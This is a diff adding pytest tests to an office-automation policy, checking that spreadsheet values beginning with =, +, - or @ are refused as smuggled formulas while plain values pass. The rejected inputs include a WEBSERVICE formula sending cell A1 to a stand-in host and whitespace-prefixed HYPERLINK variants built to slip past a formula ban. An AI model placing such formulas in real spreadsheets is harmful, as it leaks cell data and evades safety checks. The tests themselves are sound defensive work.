@@ -121,6 +121,76 @@ def test_policy_rejects_external_or_volatile_excel_formula():
     assert exc.value.code == "unsafe_formula"
 
 
+def _values_plan(values: list[list]) -> GeneratedPlan:
+    return GeneratedPlan.model_validate(
+        {
+            "summary": "Write values",
+            "warnings": [],
+            "actions": [{"type": "set_selected_values", "content": {"values": values}}],
+        }
+    )
+
+
+def _excel_values_request() -> OfficePlanRequest:
+    request = _excel_request()
+    request.context.host_capabilities.supported_actions = ["set_selected_values"]
+    return request
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        '=WEBSERVICE("https://x.example/?"&A1)',
+        '=HYPERLINK("https://x.example","Open")',
+        '+HYPERLINK("https://x.example")',
+        "-2+3",
+        "@SUM(A1:A2)",
+        "=[Book1]Sheet1!A1",
+        "=NOW()",
+        "=1+1",
+        '  =WEBSERVICE("https://x.example")',
+        '\t=HYPERLINK("https://x.example")',
+        '\r\n=HYPERLINK("https://x.example")',
+        "+1 555 0100",
+        "-",
+    ],
+)
+def test_policy_refuses_formulas_smuggled_in_as_excel_values(value):
+    # Excel parses a string written through range.values as a formula when it
+    # starts with =, +, - or @, so these would skip the unsafe-formula ban.
+    request = _excel_values_request()
+    with pytest.raises(OfficePolicyError, match="set_selected_formulas") as exc:
+        office_action_policy.bind_actions(request.context, _values_plan([[1, value]]))
+    assert exc.value.code == "formula_in_values"
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        -5,
+        -1.25,
+        0,
+        True,
+        None,
+        "-5",
+        "+1.5",
+        " -1e3 ",
+        "-.5",
+        "Total = 12",
+        "Smith v. Jones",
+        "",
+        "1-800-555-0100",
+    ],
+)
+def test_policy_allows_plain_excel_values(value):
+    request = _excel_values_request()
+    actions = office_action_policy.bind_actions(
+        request.context, _values_plan([[value, "Paid"]])
+    )
+    assert actions[0].type == "set_selected_values"
+    assert actions[0].content.values == [[value, "Paid"]]
+
+
 def test_office_pilot_allowlist_is_exact_and_fail_closed(monkeypatch):
     from app.services import office_access
 
